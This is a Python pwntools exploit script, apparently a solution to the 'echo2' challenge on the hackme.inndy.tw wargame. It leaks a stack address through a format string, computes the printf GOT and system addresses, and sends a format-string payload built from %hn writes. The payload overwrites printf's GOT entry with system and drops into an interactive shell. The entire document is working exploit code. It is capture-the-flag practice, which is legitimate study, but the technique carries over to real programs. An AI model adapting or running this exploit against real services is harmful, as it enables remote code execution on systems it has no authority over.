
#!/usr/bin/python

from pwn import *

off_printf_got = 0x555555755020-0x555555554a03 #printf_got - leak without aslr
off_system = 0x0000555555554790 - 0x555555554a03

def pad(strr):
	return strr + " "*(16-len(strr))

def cal(dest, src):
	if dest > src:
		return str(dest-src)
	elif 0x10000 + dest > src:
		return str(0x10000+dest-src)
	elif 0x20000 + dest > src:
		return str(0x20000+dest-src)
	elif 0x30000 + dest > src:
		return str(0x30000+dest-src)

#context.log_level = 'debug'
#s = process('./echo2')
s = remote('hackme.inndy.tw', 7712)
#gdb.attach(s)
s.sendline('%41$p')
leak = s.recvline()
leak = int(leak, 16)
printf_got = leak + off_printf_got
system_plt = leak + off_system
print 'leak: ' + hex(leak)
print 'printf_got: ' + hex(printf_got)
print 'system_plt: ' + hex(system_plt)
raw_input('[Enter to continue]')

system = hex(system_plt)
system_0 = int(system[10:14], 16)
#system_1 = int(system[10:12], 16)
system_2 = int(system[6:10], 16)
system_4 = int(system[2:6], 16)
print 'system_0: ' + hex(system_0)
print 'system_2: ' + hex(system_2)
print 'system_4: ' + hex(system_4)


#payload = pad("%1$" + str(system_0) + "lx")
#payload += pad("%22$")
#payload = pad("%1$" + str(system_1 ) + "lx")
#payload += pad("%23$"

len_pad_1 = 16-(len("%1$" + cal(system_0, 0) + "lx"))
payload = pad("%1$" + cal(system_0, len_pad_1) + "lx")
payload += pad("%18$hn")

len_pad_2 = 16-len("%1$" + cal(system_2, (system_0 + 10)) + "lx")
payload += pad("%1$" + cal(system_2, (system_0 + 10 + len_pad_2)) + "lx")
payload += pad("%19$hn")

len_pad_3 = 16-len("%1$" + cal(system_4, (system_2 + 10)) + "lx")
payload += pad("%1$" + cal(system_4, (system_2+ 10 + len_pad_3)) + "lx")
payload += pad("%20$hn")

payload += p64(printf_got)
#payload += p64(printf_got+1)
payload += p64(printf_got+2)
payload += p64(printf_got+4)

s.sendline(payload)
raw_input('[Enter to continue]')
s.interactive()
